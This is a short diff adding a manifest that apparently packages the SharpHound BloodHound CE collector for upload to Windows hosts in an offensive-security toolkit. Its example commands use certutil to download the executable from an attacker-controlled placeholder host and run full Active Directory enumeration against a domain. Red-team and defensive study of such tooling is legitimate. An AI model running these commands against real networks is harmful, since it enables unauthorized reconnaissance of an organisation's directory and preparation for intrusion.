@@ -1,0 +1,16 @@
+schema = 1
+kind = "upload"
+description = "Official BloodHound CE data collector for Windows"
+tags = ["ad", "bloodhound", "collector", "windows"]
+upstream = "https://github.com/SpecterOps/SharpHound"
+licence = "GPL-3.0"
+arch = "x86_64"
+examples = [
+  "certutil -urlcache -f http://{lhost}/SharpHound.exe SharpHound.exe",
+  ".\\SharpHound.exe -c All -d {domain}",
+]
+
+[[upload]]
+path = "files/SharpHound.exe"
+as = "SharpHound.exe"
+note = "BloodHound CE collector; run on the Windows host"
